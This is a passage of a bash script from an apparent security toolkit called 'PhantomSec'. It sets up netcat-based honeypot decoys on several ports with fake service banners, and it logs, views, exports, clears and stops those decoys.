  port_input="${port_input:-2222 2121 2323 8080 4444}"
  echo ""

  local -A banners=([2222]="SSH-2.0-OpenSSH_8.9p1" [2121]="220 FTP server ready" [2323]="Termux login:" [8080]="HTTP/1.1 200 OK" [4444]="")
  local pids=()

  for p in $port_input; do
    if ! [[ "$p" =~ ^[0-9]+$ ]] || [ "$p" -lt 1 ] || [ "$p" -gt 65535 ]; then
      echo -e "  ${Y}[!] Skipping invalid port: $p${NC}"; continue
    fi
    local bnr="${banners[$p]:-PhantomSec Honeypot}"
    (
      _hp_log "MULTI" "Decoy started on port $p"
      while true; do
        local hit
        hit=$(printf '%s\r\n' "$bnr" | nc -l -p "$p" -q 1 2>/dev/null)
        _hp_log "MULTI" "Hit on :$p | data=$(echo "$hit" | head -2 | tr '\n' '|')"
      done
    ) &
    local bg_pid=$!
    pids+=($bg_pid)
    _hp_register_pid "$bg_pid"
    echo -e "  ${G}[✓]${NC} Listening on port ${DC}$p${NC} (PID $bg_pid)"
  done

  echo ""
  echo -e "  ${Y}[!] All decoys running in background. Use option [5] to stop.${NC}"
  press_enter
}

# ── Honeypot: view log ─────────────────────────────────────────────────
run_honeypot_viewlog() {
  show_banner; draw_box "  🍯 HONEYPOT LOG" 66; echo ""
  if [ ! -f "$HONEYPOT_LOG" ]; then
    echo -e "  ${Y}[!] No honeypot log found yet. Start a honeypot first.${NC}"
  else
    local total; total=$(wc -l < "$HONEYPOT_LOG")
    echo -e "  ${C}Log file:${NC} $HONEYPOT_LOG  (${G}$total entries${NC})"
    echo ""; draw_line "─" 66
    # Summary stats
    local tcp_hits http_hits multi_hits
    tcp_hits=$(grep -c '\[TCP\].*Hit' "$HONEYPOT_LOG" 2>/dev/null || echo 0)
    http_hits=$(grep -c '\[HTTP\].*Hit' "$HONEYPOT_LOG" 2>/dev/null || echo 0)
    multi_hits=$(grep -c '\[MULTI\].*Hit' "$HONEYPOT_LOG" 2>/dev/null || echo 0)
    echo -e "  ${G}TCP hits:${NC} $tcp_hits   ${G}HTTP hits:${NC} $http_hits   ${G}Multi hits:${NC} $multi_hits"
    draw_line "─" 66; echo ""
    tail -40 "$HONEYPOT_LOG"
    draw_line "─" 66
    echo ""
    echo -e "  ${DC}[1]${NC} Export log  ${DC}[2]${NC} Clear log  ${DC}[0]${NC} Back"
    echo -ne "\n  ${M}▶${NC} "; read -r o
    case "$o" in
      1) local out="$PHANTOMSEC_DIR/reports/honeypot_export_$(date +%s).txt"
         cp "$HONEYPOT_LOG" "$out"
         echo -e "  ${G}[✓] Exported to $out${NC}" ;;
      2) > "$HONEYPOT_LOG"
         echo -e "  ${G}[✓] Log cleared.${NC}" ;;
    esac
  fi
  press_enter
}

# ── Honeypot: live monitor ─────────────────────────────────────────────
run_honeypot_monitor() {
  echo -e "  ${C}[*] Live honeypot monitor — press Ctrl+C to exit${NC}"
  echo ""
  touch "$HONEYPOT_LOG"
  tail -f "$HONEYPOT_LOG"
}

# ── Honeypot: stop all ─────────────────────────────────────────────────
stop_all_honeypots() {
  show_banner; draw_box "  🍯 STOP HONEYPOTS" 66; echo ""
  if [ ! -f "$HONEYPOT_PID_FILE" ]; then
    echo -e "  ${Y}[!] No honeypot PIDs recorded.${NC}"; press_enter; return
  fi
  local killed=0
  while IFS= read -r pid; do
    if kill "$pid" 2>/dev/null; then
      echo -e "  ${G}[✓] Killed PID $pid${NC}"
      ((killed++))
    fi
  done < "$HONEYPOT_PID_FILE"
  rm -f "$HONEYPOT_PID_FILE"
  _hp_log "SYSTEM" "All honeypots stopped ($killed processes killed)"
  echo ""
  echo -e "  ${G}[✓] Stopped $killed honeypot process(es).${NC}"
  press_enter
}

# ── Entry point ────────────────────────────────────────────────────────
main_menu
